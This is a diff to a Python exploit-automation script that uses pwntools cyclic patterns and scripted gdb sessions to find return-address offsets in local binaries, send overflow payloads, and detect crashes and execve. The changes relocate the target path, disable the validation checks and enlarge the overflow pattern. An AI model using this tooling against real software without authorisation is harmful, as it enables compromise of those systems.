@@ -29,10 +29,10 @@ env_vars = {
 
 def check_target_bin(target):
 
-    if not os.path.isfile(f'/usr/local/bin/{target}'):
-        raise argparse.ArgumentTypeError(f"Error: '{target}' does not exist.")
-    if not os.access(f'/usr/local/bin/{target}', os.X_OK):
-        raise argparse.ArgumentTypeError(f"Error: '{target}' is not executable or permission is denied.")
+    # if not os.path.isfile(f'/usr/local/bin/{target}'):
+    #     raise argparse.ArgumentTypeError(f"Error: '{target}' does not exist.")
+    # if not os.access(f'/mnt/binaries/{target}', os.X_OK):
+    #     raise argparse.ArgumentTypeError(f"Error: '{target}' is not executable or permission is denied.")
     
     return target
     
@@ -46,15 +46,15 @@ def check_args():
     parser.add_argument(
         "target",
         type=check_target_bin,
-        help="The target binary file to execute (must exist in /usr/local/bin and be executable)"
+        help="The target binary file to execute (must exist in /mnt/binaries and be executable)"
     )
 
-    parser.add_argument(
-        "input_mode",
-        type=int,
-        choices=[0, 1],
-        help="Input mode for the target: 0 for stdin (default), 1 for command-line input"
-    )
+    # parser.add_argument(
+    #     "input_mode",
+    #     type=int,
+    #     choices=[0, 1],
+    #     help="Input mode for the target: 0 for stdin (default), 1 for command-line input"
+    # )
     args = parser.parse_args()
 
 
@@ -70,7 +70,7 @@ def cleanup(exit_code: int):
 
 
 def generate_test():
-    return cyclic(1000)
+    return cyclic(10000)
 
 
 def locate_ra(pattern, target):
@@ -108,7 +108,7 @@ def locate_ra(pattern, target):
     gdb_proc.stdin.write("info frame\n")
     gdb_proc.stdin.flush()
 
-    gdb_proc.stdin.write("x/40x $esp-160\n")
+    gdb_proc.stdin.write("x/40x $esp-1100\n")
     gdb_proc.stdin.flush()
 
     gdb_proc.stdin.write("q\n")
@@ -312,14 +312,13 @@ def detect_execve():
 
 def main():
         
-    if len(sys.argv) != 3:
+    if len(sys.argv) != 2:
         sys.exit(1)
 
     args = check_args()
 
     # Extract arguments
     target = args.target
-    input_mode = args.input_mode
 
     # context.log_level='warn'
     # context.log_level = 'debug'
@@ -354,7 +353,7 @@ def main():
                     cleanup(0)
 
 
-                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for vuln to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
+                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
                 
                 if output:
                     if detect_crash(exploit_proc.pid) or i == 1:
